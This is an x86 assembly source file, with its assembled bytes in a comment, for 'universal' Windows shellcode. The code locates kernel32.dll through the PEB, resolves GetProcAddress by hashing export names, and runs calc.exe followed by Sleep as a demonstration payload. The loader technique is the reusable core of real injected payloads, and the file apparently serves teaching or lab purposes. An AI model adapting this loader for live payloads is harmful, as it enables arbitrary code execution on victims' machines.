USE32 

; 
; This is an universal shellcode
;
; nasm shellcode.asm
;
; jaeseo.lee@kaist.ac.kr
;
; -----------------------------
; E9 BA 00 00 00 64 A1 30 00 00 00 8B 70 0C 8B 76 1C 8B 5E 08 80 7E 1C 18 8B 36 75 F5 8B 43 3C 8B 44 03 78 8D 74 03 1C B9 03 00 00 00 AD 01 D8 50 E2 FA 5D 5F 8B 34 8F 01 DE 31 C0 31 D2 99 AC C1 CA 05 01 C2 48 79 F7 C1 C2 05 41 8B 44 24 04 8B 00 39 D0 75 DF 58 0F B7 54 4D FE 89 D9 03 0C 90 89 C8 83 C4 04 EB 29 59 50 53 51 53 FF D0 89 C1 5B 58 EB 2C 5A 50 53 6A 05 52 FF D1 5B 58 EB 31 59 50 53 51 53 FF D0 68 00 00 10 00 FF D0 5B 58 E8 D2 FF FF FF 57 69 6E 45 78 65 63 00 00 00 00 E8 CF FF FF FF 63 61 6C 63 2E 65 78 65 00 00 00 00 E8 CA FF FF FF 53 6C 65 65 70 00 00 00 00 E8 41 FF FF FF FB 61 CF 04 
;-------------------------------
;

CODE_START:
	jmp LOAD_HASH

LOAD_K32:
; 1. Obtain the kernel32.dll base address
	; Obtain PEB address using Win32 Thread Information Block
	mov eax, [fs:0x30]

	; Obtain _PEB_LDR_DATA address from PEB
	mov esi, [eax+0xc]

	; Obtain kernel32.dll address in InInitializationOrderModuleList
	mov esi, [esi+0x1c]

NEXT_MODULE_LIST:
	mov ebx, [esi+0x8]
	cmp byte [esi+0x1c], 0x18
	mov esi, [esi]
	jnz NEXT_MODULE_LIST

	; the resulting base address of kernel32.dll is in EBX.

; 2. Find the address of GetProcAddress function

	; Obtain PE header RVA(+0x3c) from PE structure
	mov eax, [ebx+0x3c]

	; Obtain ExportAddressTable(EAT) RVA(+0x78) from PE header
	mov eax, [ebx+eax+0x78]

	; Obtain GetProcAddress function RVA from EAT
	lea esi, [ebx+eax+0x1c]
	mov ecx,3

LOAD_RVA:
	lodsd
	add eax, ebx
	push eax
	loop LOAD_RVA
	pop ebp
	pop edi

LOAD_API:
	mov esi, [edi+4*ecx]
	add esi, ebx
	xor eax, eax
	xor edx, edx
	cdq

HASH_API:
	lodsb
	ror edx,5
	add edx,eax
	dec eax
	jns HASH_API
	rol edx,5
	inc ecx
	mov eax, [esp+4]
	mov eax, [eax]
	cmp eax, edx
	jne LOAD_API

HASH_FOUND:
	pop eax
	movzx edx, word [ebp+2*ecx-2]
	mov ecx, ebx
	add ecx, [eax+4*edx]
	mov eax, ecx
	add esp, 4
	
	; the resulting GetProcAddress function address is in EAX.
	
; 3. Use GetProcAddress to find the address of WinExec function
	; EAX = GetProcAddress, EBX = Handle of kernel32.dll 

	jmp GetWinExecString
GetWinExecStringReturn:
	pop ecx  ; "WinExec"

	push eax ; backup EAX and EBX registers
	push ebx

	push ecx
	push ebx
	call eax ; GetProcAddress('kernel32.dll', 'WinExec')
	mov ecx, eax

	; the resulting WinExec function address is in ECX.

	pop ebx ; restore EAX and EBX registers
	pop eax

; 4. Execute Calc.exe using WinExec
	; EAX = GetProcAddress, EBX = Handle of kernel32.dll, ECX = WinExec
	
	jmp GetCalcExeString
GetCalcExeStringReturn:
	pop edx  ; "calc.exe"

	push eax ; backup EAX and EBX registers
	push ebx

	push 0x5 ; SW_SHOW
	push edx 
	call ecx ; WinExec("calc.exe", SW_SHOW);

	pop ebx  ; restore EAX and EBX registers
	pop eax

; 5. Use GetProcAddress to find the address of Sleep function and call
	; EAX = GetProcAddress, EBX = Handle of kernel32.dll 

	jmp GetSleepString
GetSleepStringReturn:
	pop ecx  ; "Sleep"

	push eax ; backup EAX and EBX registers
	push ebx

	push ecx
	push ebx
	call eax ; GetProcAddress('kernel32.dll', 'Sleep')

	; the resulting Sleep function address is in EAX.

	push 0x100000
	call eax ; Sleep(0x100000);

	pop ebx  ; restore EAX and EBX registers
	pop eax

; 6. Next API ...

GetWinExecString:
	call GetWinExecStringReturn
	db 'WinExec'
	dd 0

GetCalcExeString:
	call GetCalcExeStringReturn
	db 'calc.exe'
	dd 0

GetSleepString:
	call GetSleepStringReturn
	db 'Sleep'
	dd 0

LOAD_HASH:
	call LOAD_K32

API_HASH:	
	dd 0x4cf61fb ; ROR(5) Hash of GetProcAddress 

CODE_END: